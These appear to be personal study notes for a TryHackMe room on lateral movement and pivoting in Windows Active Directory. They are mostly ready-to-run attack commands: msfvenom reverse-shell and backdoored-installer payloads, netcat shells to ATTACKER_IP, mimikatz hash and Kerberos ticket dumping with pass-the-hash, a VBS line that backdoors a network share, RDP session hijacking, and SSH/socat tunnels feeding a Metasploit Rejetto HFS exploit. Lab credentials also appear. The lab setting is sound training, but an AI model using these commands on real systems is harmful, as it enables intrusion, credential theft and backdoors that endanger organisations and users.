suzanne.morris Password: P@ssw0rd
 
[https://tryhackme.com/room/lateralmovementandpivoting](https://tryhackme.com/room/lateralmovementandpivoting)
 
# Start remote processes

## psexec

### Ports: 445/TCP (SMB)

### Required Group Memberships: Administrators
 
1. psexec64.exe [\\<MACHINE-IP>](file:///\\<MACHINE-IP>) -u Administrator -p <password>-i cmd.exe
 
## Remote Process Creation Using WinRM

### Ports: 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)

### Required Group Memberships: Remote Management Users
 
CMD.exe:

1. winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
 _Powershell:_

1. $username = 'Administrator';
2. $password = 'Mypass123';
3. $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
4. $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;￼
5. Enter-PSSession -Computername TARGET -Credential $credential

OR

7. Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
 
## Remotely Creating Services Using sc

### Ports:

### 135/TCP, 49152-65535/TCP (DCE/RPC)

### 445/TCP (RPC over SMB Named Pipes)

### 139/TCP (RPC over SMB Named Pipes)

### Required Group Memberships: Administrators

the command's output won't be available to us, making this a blind attack.
 
1. sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
2. sc.exe \\TARGET start THMservice
3. sc.exe \\TARGET stop THMservice
4. sc.exe \\TARGET delete THMservice
 
## Creating Scheduled Tasks Remotely

the command's output won't be available to us, making this a blind attack.
 
1. schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00
2. schtasks /s TARGET /run /TN "THMtask1"
3. schtasks /S TARGET /TN "THMtask1" /DELETE /F
 
---------------  
While we have already shown how to use sc to create a user on a remote system (by using net user), we can also upload any binary we'd like to execute and associate it with the created service. However, if we try to run a reverse shell using this method, we will notice that the reverse shell disconnects immediately after execution. The reason for this is that service executables are different to standard .exe files, and therefore non-service executables will end up being killed by the service manager almost immediately. _Luckily for us, msfvenom supports the_ **exe-service** _format, which will encapsulate any payload we like inside a fully functional service executable, preventing it from getting killed._
 
# Upload reverse shell payload remotely using sc.exe and msfvenom:

_Asuming you only have ssh access to host._

1. msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe
2. smbclient -c 'put myservice.exe' -U <admin.cred> -W <workgroup> '//<target_domain>/admin$/'
3. Setup multihandler on metsasploit
    
    1. use exploit/multi/handler
    2. OR
    3. msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST <local_ip>; set LPORT 4444;exploit"￼

Run the following to inject the admin credentials into the host so it will the service executable, since you cant specify creds with sc.exe:

5. runas /netonly /user:<domain>\<user.name>"<path_to_netcat_bin> -e cmd.exe <ATTACKER_IP> 4443"
6. nc -lvp 4443
7. sc.exe [\\<target_domain>](file:///\\<target_domain>) create Service-1008 binPath= "%windir%\myservice.exe" start= auto
8. sc.exe [\\<target_domain>](file:///\\<target_domain>) start Service-1008
    
# Windows Management Instrumentation (WMI)

## Create session with WMI

Powershell:

1. $username = 'Administrator';
2. $password = 'Mypass123';
3. $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
4. $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;￼
5. $Opt = New-CimSessionOption -Protocol DCOM
6. $Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop￼

## Remote Process Creation Using WMI

### Ports:

### 135/TCP, 49152-65535/TCP (DCERPC)

### 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)

### Required Group Memberships: Administrators
  2. $Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere"; 4. Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $Command}    

Notice that WMI won't allow you to see the output of any command but will indeed create the required process silently.
 
On legacy systems, the same can be done using wmic from the command prompt:

1. wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe"
 
## Creating Services Remotely with WMI

### Ports:

### 135/TCP, 49152-65535/TCP (DCERPC)

### 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)

### Required Group Memberships: Administrators
 
1. Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
2. Name = "THMService2";
3. DisplayName = "THMService2";
4. PathName = "net user munra2 Pass123 /add"; # Your payload
5. ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
6. StartMode = "Manual"}  
And then, we can get a handle on the service and start it with the following commands:

1. $Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"
2. Invoke-CimMethod -InputObject $Service -MethodName StartService  
Finally, we can stop and delete the service with the following commands:

1. Invoke-CimMethod -InputObject $Service -MethodName StopService
2. Invoke-CimMethod -InputObject $Service -MethodName Delete
 
## Creating Scheduled Tasks Remotely with WMI

### Ports:

### 135/TCP, 49152-65535/TCP (DCERPC)

### 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)

### Required Group Memberships: Administrators
 
# Payload must be split in Command and Args

1. $Command = "cmd.exe"
2. $Args = "/c net user munra22 aSdf1234 /add"
3. $Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
4. Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
5. Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"
 
To delete the scheduled task after it has been used, we can use the following command:

1. Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
 
## Installing MSI packages through WMI

### Ports:

### 135/TCP, 49152-65535/TCP (DCERPC)

### 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)

### Required Group Memberships: Administrators
 
MSI is a file format used for installers. If we can copy an MSI package to the target system, we can then use WMI to attempt to install it for us. The file can be copied in any way available to the attacker. Once the MSI file is in the target system, we can attempt to install it by invoking the Win32_Product class through WMI:

1. Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
 
We can achieve the same by us using wmic in legacy systems:

1. wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
 
# Using WMI and MSI packages to move laterally to THMIIS:

1. msfvenom -p windows/x64/shell_reverse_tcp LHOST=<local_ip> LPORT=4445 -f msi > installer.msi
2. smbclient -c 'put installer.msi' -U <admin.user> -W <workgroup> '//<DOMAIN>/admin$/'  
Since we copied our payload to the ADMIN$ share, it will be available at C:\Windows\ on the server.

1. Start metasploit multi handler

_In powershell on the reg user's prompt:_

$username = 't1_corine.waters';  
$password = 'Korine.1994';  
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;  
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;  
$Opt = New-CimSessionOption -Protocol DCOM  
$Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop

_Now invoke the payload:_

Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\installer.msi"; Options = ""; AllUsers = $false}
   

# NTLM AUTHENTICATION

# Pass the Hash

Instead of having to crack NTLM hashes, if the Windows domain is configured to use NTLM authentication, we can Pass-the-Hash (PtH) and authenticate successfully.
 
## Extracting hashes from SAM using mimikatz (local users only):

mimikatz # privilege::debug  
mimikatz # token::elevate  
mimikatz # lsadump::sam
 
## Extracting ntlm hashes from LSASS (local and domain users):

mimikatz # privilege::debug  
mimikatz # token::elevate  
mimikatz # sekurlsa::msv
 _Pass the hash:_

mimikatz # token::revert  
mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
 _You can also use the following methods from your kali:_

### Connect to RDP using PtH:

xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
 
### Connect via psexec using PtH:

psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP  
Note: Only the linux version of psexec support PtH.
 
### Connect to WinRM using PtH:

evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
 
# KERBEROS AUTHENTICATION

# Pass the ticket
 
mimikatz # privilege::debug  
mimikatz # sekurlsa::tickets /export
 
### Notice that if we only had access to a ticket but not its corresponding session key, we wouldn't be able to use that ticket; therefore, both are necessary.
 
### While mimikatz can extract any TGT or TGS available from the memory of the LSASS process, most of the time, we'll be interested in TGTs as they can be used to request access to any services the user is allowed to access. At the same time, TGSs are only good for a specific service. Extracting TGTs will require us to have administrator's credentials, and extracting TGSs can be done with a low-privileged account (only the ones assigned to that account).
 _Once we have extracted the desired ticket, we can inject the tickets into the current session with the following command:_  

mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
 
# Overpass-the-hash / Pass-the-Key

This kind of attack is similar to PtH but applied to Kerberos networks.
 _We can obtain the Kerberos encryption keys from memory by using mimikatz with the following commands:_

mimikatz # privilege::debug  
mimikatz # sekurlsa::ekeys
 _If we have the AES256 hash:_

mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
 _Open prompt on IIS Server:_

winrs.exe -r:THMIIS.za.tryhackme.com cmd
   

# User Behaviors

## Abusing Writable Shares

It is quite common to find network shares that legitimate users use to perform day-to-day tasks when checking corporate environments. If those shares are writable for some reason, an attacker can plant specific files to force users into executing any arbitrary payload and gain access to their machines.
 
One common scenario consists of finding a shortcut to a script or executable file hosted on a network share.
 
The rationale behind this is that the administrator can maintain an executable on a network share, and users can execute it without copying or installing the application to each user's machine. If we, as attackers, have write permissions over such scripts or executables, we can backdoor them to force users to execute any payload we want.
 
Although the script or executable is hosted on a server, when a user opens the shortcut on his workstation, the executable will be copied from the server to its %temp% folder and executed on the workstation. Therefore any payload will run in the context of the final user's workstation (and logged-in user account).
 
## Backdooring .vbs Scripts

As an example, if the shared resource is a VBS script, we can put a copy of nc64.exe on the same share and inject the following code in the shared script:
 _CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y [\\10.10.28.6\myshare\nc64.exe](file:///\\10.10.28.6\myshare\nc64.exe) %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True_  

This will copy nc64.exe from the share to the user's workstation %tmp% directory and send a reverse shell back to the attacker whenever a user opens the shared VBS script.
 
## Backdooring .exe Files

If the shared file is a Windows binary, say putty.exe, you can download it from the share and use msfvenom to inject a backdoor into it. The binary will still work as usual but execute an additional payload silently. To create a backdoored putty.exe, we can use the following command:
 _msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe_  

The resulting puttyX.exe will execute a reverse_tcp meterpreter payload without the user noticing it. Once the file has been generated, we can replace the executable on the windows share and wait for any connections using the exploit/multi/handler module from Metasploit.
 
## RDP hijacking

When an administrator uses Remote Desktop to connect to a machine and closes the RDP client instead of logging off, his session will remain open on the server indefinitely. If you have SYSTEM privileges on Windows Server 2016 and earlier, you can take over any existing RDP session without requiring a password.
 
If we have administrator-level access, we can get SYSTEM by any method of our preference. For now, we will be using psexec to do so. First, let's run a cmd.exe as administrator:
 
Run commands prompt as administrator
 _From there, run PsExec64.exe(available at C:\tools\):_ _PsExec64.exe -s cmd.exe_  
_To list the existing sessions on a server, you can use the following command:_

C:\> query user  
USERNAME SESSIONNAME ID STATE IDLE TIME LOGON TIME  
>administrator rdp-tcp#6 2 Active . 4/1/2022 4:09 AM  
luke 3 Disc . 4/6/2022 6:51 AM
 
According to the command output above, if we were currently connected via RDP using the administrator user, our SESSIONNAME would be rdp-tcp#6. We can also see that a user named luke has left a session open with id 3. Any session with a Disc state has been left open by the user and isn't being used at the moment. While you can take over active sessions as well, the legitimate user will be forced out of his session when you do, which could be noticed by them.
 _To connect to a session, we will use tscon.exe and specify the session ID we will be taking over, as well as our current SESSIONNAME. Following the previous example, to takeover luke's session if we were connected as the administrator user, we'd use the following command:_ _tscon 3 /dest:rdp-tcp#6_  

In simple terms, the command states that the graphical session 3 owned by luke, should be connected with the RDP session rdp-tcp#6, owned by the administrator user.
 
As a result, we'll resume luke's RDP session and connect to it immediately.
 
Note: Windows Server 2019 won't allow you to connect to another user's session without knowing its password.  
'''  
Username: t2_jack.osborne Password: Lolo1983  
xfreerdp /v:thmjmp2.za.tryhackme.com /u:t2_jack.osborne /p:Lolo1983  
'''
 
# Port Forwarding

## SSH Tunnelling

The first protocol we'll be looking at is SSH, as it already has built-in functionality to do port forwarding through a feature called SSH Tunneling. While SSH used to be a protocol associated with Linux systems, Windows now ships with the OpenSSH client by default, so you can expect to find it in many systems nowadays, independent of their operating system.
 
SSH Tunnelling can be used in different ways to forward ports through an SSH connection, which we'll use depending on the situation. To explain each case, let's assume a scenario where we've gained control over the PC-1 machine (it doesn't need to be administrator access) and would like to use it as a pivot to access a port on another machine to which we can't directly connect. We will start a tunnel from the PC-1 machine, acting as an SSH client, to the Attacker's PC, which will act as an SSH server. The reason to do so is that you'll often find an SSH client on Windows machines, but no SSH server will be available most of the time.
 
Since we'll be making a connection back to our attacker's machine, we'll want to create a user in it without access to any console for tunnelling and set a password to use for creating the tunnels:
 _useradd tunneluser -m -d /home/tunneluser -s /bin/true  
passwd tunneluser_  

Depending on your needs, the SSH tunnel can be used to do either local or remote port forwarding. Let's take a look at each case.
 
## SSH Remote Port Forwarding

In our example, let's assume that firewall policies block the attacker's machine from directly accessing port 3389 on the server. If the attacker has previously compromised PC-1 and, in turn, PC-1 has access to port 3389 of the server, it can be used to pivot to port 3389 using remote port forwarding from PC-1. Remote port forwarding allows you to take a reachable port from the SSH client (in this case, PC-1) and project it into a remote SSH server (the attacker's machine).
 
As a result, a port will be opened in the attacker's machine that can be used to connect back to port 3389 in the server through the SSH tunnel. PC-1 will, in turn, proxy the connection so that the server will see all the traffic as if it was coming from PC-1:
 
A valid question that might pop up by this point is why we need port forwarding if we have compromised PC-1 and can run an RDP session directly from there. The answer is simple: in a situation where we only have console access to PC-1, we won't be able to use any RDP client as we don't have a GUI. By making the port available to your attacker's machine, you can use a Linux RDP client to connect. Similar situations arise when you want to run an exploit against a port that can't be reached directly, as your exploit may require a specific scripting language that may not always be available at machines you compromise along the way.
 
Referring to the previous image, to forward port 3389 on the server back to our attacker's machine, we can use the following command on PC-1:
 
PC1: Command Prompt  
C:\> ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N
 
This will establish an SSH session from PC-1 to 1.1.1.1 (Attacker PC) using the tunneluser user.
 
Since the tunneluser isn't allowed to run a shell on the Attacker PC, we need to run the ssh command with the -N switch to prevent the client from requesting one, or the connection will exit immediately. The -R switch is used to request a remote port forward, and the syntax requires us first to indicate the port we will be opening at the SSH server (3389), followed by a colon and then the IP and port of the socket we'll be forwarding (3.3.3.3:3389). Notice that the port numbers don't need to match, although they do in this example.
 
The command itself won't output anything, but the tunnel will depend on the command to be running. Whenever we want, we can close the tunnel by pressing CTRL+C as with any other command.
 
Once our tunnel is set and running, we can go to the attacker's machine and RDP into the forwarded port to reach the server:
 
Attacker's Machine  
munra@attacker-pc$ xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPassword
 
## SSH Local Port Forwarding

Local port forwarding allows us to "pull" a port from an SSH server into the SSH client. In our scenario, this could be used to take any service available in our attacker's machine and make it available through a port on PC-1. That way, any host that can't connect directly to the attacker's PC but can connect to PC-1 will now be able to reach the attacker's services through the pivot host.
 
Using this type of port forwarding would allow us to run reverse shells from hosts that normally wouldn't be able to connect back to us or simply make any service we want available to machines that have no direct connection to us.
 
To forward port 80 from the attacker's machine and make it available from PC-1, we can run the following command on PC-1:
 
PC1: Command Prompt  
C:\> ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N
 
The command structure is similar to the one used in remote port forwarding but uses the -L option for local port forwarding. This option requires us to indicate the local socket used by PC-1 to receive connections (*:80) and the remote socket to connect to from the attacker's PC perspective (127.0.0.1:80).
 
Notice that we use the IP address 127.0.0.1 in the second socket, as from the attacker's PC perspective, that's the host that holds the port 80 to be forwarded.
 
Since we are opening a new port on PC-1, we might need to add a firewall rule to allow for incoming connections (with dir=in). Administrative privileges are needed for this:
 _netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80_  

Once your tunnel is set up, any user pointing their browsers to PC-1 at http://2.2.2.2:80 and see the website published by the attacker's machine.
 
## Port Forwarding With socat

In situations where SSH is not available, socat can be used to perform similar functionality. While not as flexible as SSH, socat allows you to forward ports in a much simpler way. One of the disadvantages of using socat is that we need to transfer it to the pivot host (PC-1 in our current example), making it more detectable than SSH, but it might be worth a try where no other option is available.
 
The basic syntax to perform port forwarding using socat is much simpler. If we wanted to open port 1234 on a host and forward any connection we receive there to port 4321 on host 1.1.1.1, you would have the following command:
 _socat TCP4-LISTEN:1234,fork TCP4:1.1.1.1:4321_  

The fork option allows socat to fork a new process for each connection received, making it possible to handle multiple connections without closing. If you don't include it, socat will close when the first connection made is finished.
 
Coming back to our example, if we wanted to access port 3389 on the server using PC-1 as a pivot as we did with SSH remote port forwarding, we could use the following command:
 
PC-1: Command Prompt  
C:\>socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389
 
Note that socat can't forward the connection directly to the attacker's machine as SSH did but will open a port on PC-1 that the attacker's machine can then connect to:
 
As usual, since a port is being opened on the pivot host, we might need to create a firewall rule to allow any connections to that port:
 _netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow protocol=TCP localport=3389_  

If, on the other hand, we'd like to expose port 80 from the attacker's machine so that it is reachable by the server, we only need to adjust the command a bit:
 
PC-1: Command Prompt  
C:\>socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80
 
As a result, PC-1 will spawn port 80 and listen for connections to be forwarded to port 80 on the attacker's machine
 
## Dynamic Port Forwarding and SOCKS

While single port forwarding works quite well for tasks that require access to specific sockets, there are times when we might need to run scans against many ports of a host, or even many ports across many machines, all through a pivot host. In those cases, dynamic port forwarding allows us to pivot through a host and establish several connections to any IP addresses/ports we want by using a SOCKS proxy.
 
Since we don't want to rely on an SSH server existing on the Windows machines in our target network, we will normally use the SSH client to establish a reverse dynamic port forwarding with the following command:
 
PC1: Command Prompt  
C:\> ssh tunneluser@1.1.1.1 -R 9050 -N
 
In this case, the SSH server will start a SOCKS proxy on port 9050, and forward any connection request through the SSH tunnel, where they are finally proxied by the SSH client.
 
The most interesting part is that we can easily use any of our tools through the SOCKS proxy by using proxychains. To do so, we first need to make sure that proxychains is correctly configured to point any connection to the same port used by SSH for the SOCKS proxy server. The proxychains configuration file can be found at /etc/proxychains.conf on your AttackBox. If we scroll down to the end of the configuration file, we should see a line that indicates the port in use for socks proxying:
 _[ProxyList]  
socks4 127.0.0.1 9050_  

The default port is 9050, but any port will work as long as it matches the one we used when establishing the SSH tunnel.
 
If we now want to execute any command through the proxy, we can use proxychains:
 _proxychains curl [http://pxeboot.za.tryhackme.com](http://pxeboot.za.tryhackme.com)_  

Note that some software like nmap might not work well with SOCKS in some circumstances, and might show altered results, so your mileage might vary.
 
## Tunnelling Complex Exploits

The THMDC (target) server is running a vulnerable version of Rejetto HFS. The problem we face is that firewall rules restrict access to the vulnerable port so that it can only be viewed from THMJMP2 (proxy). Furthermore, outbound connections from THMDC are only allowed machines in its local network, making it impossible to receive a reverse shell directly to our attacker's machine. To make things worse, the Rejetto HFS exploit requires the attacker to host an HTTP server to trigger the final payload, but since no outbound connections are allowed to the attacker's machine, we would need to find a way to host a web server in one of the other machines in the same network, which is not at all convenient. We can use port forwarding to overcome all of these problems.
 
First, let's take a look at how the exploit works. First, it will connect to the HFS port (RPORT in Metasploit) to trigger a second connection. This second connection will be made against the attacker's machine on SRVPORT, where a web server will deliver the final payload. Finally, the attacker's payload will execute and send back a reverse shell to the attacker on LPORT:
 
HFS exploit
 
With this in mind, we could use SSH to forward some ports from the attacker's machine to THMJMP2 (SRVPORT for the web server and LPORT to receive the reverse shell) and pivot through THMJMP2 to reach RPORT on THMDC. We would need to do three port forwards in both directions so that all the exploit's interactions can be proxied through THMJMP2:
 
HFS Forwarded exploit
 
Rejetto HFS will be listening on port 80 on the target host, so we need to tunnel that port back to our attacker's machine through the proxy host using remote port forwarding. Since the attackbox has port 80 occupied with another service, we will need to link port 80 on the target host with some port not currently in use by the attackbox. Let's use port 8888. When running ssh in the proxy host to forward this port, we would have to add -R 8888:<target_IP>:80 to our command.
 
For SRVPORT and LPORT, let's choose two random ports at will. For demonstrative purposes, we'll set SRVPORT=6666 and LPORT=7878, but be sure to use different ports as the lab is shared with other students, so if two of you choose the same ports, when trying to forward them, you'll get an error stating that such port is already in use on the proxy host.
 
To forward such ports from our attacker machine to the proxy host, we will use local port forwarding by adding -L *:6666:127.0.0.1:6666 and -L *:7878:127.0.0.1:7878 to our ssh command. This will bind both ports on the proxy host and tunnel any connection back to our attacker machine.
 
Putting the whole command together, we would end up with the following:
 
On the Proxy host: Command Prompt  
C:\> ssh user@ATTACKER_IP -R 8888:<target_IP>:80 -L *:6666:127.0.0.1:6666 -L *:7878:127.0.0.1:7878 -N
 
Note: If you are using the AttackBox and have joined other network rooms before, be sure to select the IP address assigned to the tunnel interface facing the lateralmovementandpivoting network as your ATTACKER_IP, or else your reverse shells/connections won't work properly. For your convenience, the interface attached to this network is called lateralmovement, so you should be able to get the right IP address by running ip add show lateralmovement:
 
Once all port forwards are in place, we can start Metasploit and configure the exploit so that the required ports match the ones we have forwarded through THMJMP2:
 
AttackBox  
user@AttackBox$ msfconsole  
msf6 > use rejetto_hfs_exec  
msf6 exploit(windows/http/rejetto_hfs_exec) > set payload windows/shell_reverse_tcp
 _msf6 exploit(windows/http/rejetto_hfs_exec) > set lhost thmjmp2.za.tryhackme.com  
msf6 exploit(windows/http/rejetto_hfs_exec) > set ReverseListenerBindAddress 127.0.0.1  
msf6 exploit(windows/http/rejetto_hfs_exec) > set lport 7878  
msf6 exploit(windows/http/rejetto_hfs_exec) > set srvhost 127.0.0.1  
msf6 exploit(windows/http/rejetto_hfs_exec) > set srvport 6666_  
_msf6 exploit(windows/http/rejetto_hfs_exec) > set rhosts 127.0.0.1  
msf6 exploit(windows/http/rejetto_hfs_exec) > set rport 8888  
msf6 exploit(windows/http/rejetto_hfs_exec) > exploit  
There is a lot to unpack here:_  

The LHOST parameter usually serves two purposes: it is used as the IP where a listener is bound on the attacker's machine to receive a reverse shell; it is also embedded on the payload so that the victim knows where to connect back when the exploit is triggered. In our specific scenario, since THMDC won't be able to reach us, we need to force the payload to connect back to THMJMP2, but we need the listener to bind to the attacker's machine on 127.0.0.1. To this end, Metasploit provides an optional parameter ReverseListenerBindAddress, which can be used to specify the listener's bind address on the attacker's machine separately from the address where the payload will connect back. In our example, we want the reverse shell listener to be bound to 127.0.0.1 on the attacker's machine and the payload to connect back to THMJMP2 (as it will be forwarded to the attacker machine through the SSH tunnel).  
Our exploit must also run a web server to host and send the final payload back to the victim server. We use SRVHOST to indicate the listening address, which in this case is 127.0.0.1, so that the attacker machine binds the webserver to localhost. While this might be counterintuitive, as no external host would be able to point to the attacker's machine localhost, the SSH tunnel will take care of forwarding any connection received on THMJMP2 at SRVPORT back to the attacker's machine.  
The RHOSTS is set to point to 127.0.0.1 as the SSH tunnel will forward the requests to THMDC through the SSH tunnel established with THMJMP2. RPORT is set to 8888, as any connection sent to that port on the attacker machine will be forwarded to port 80 on THMDC.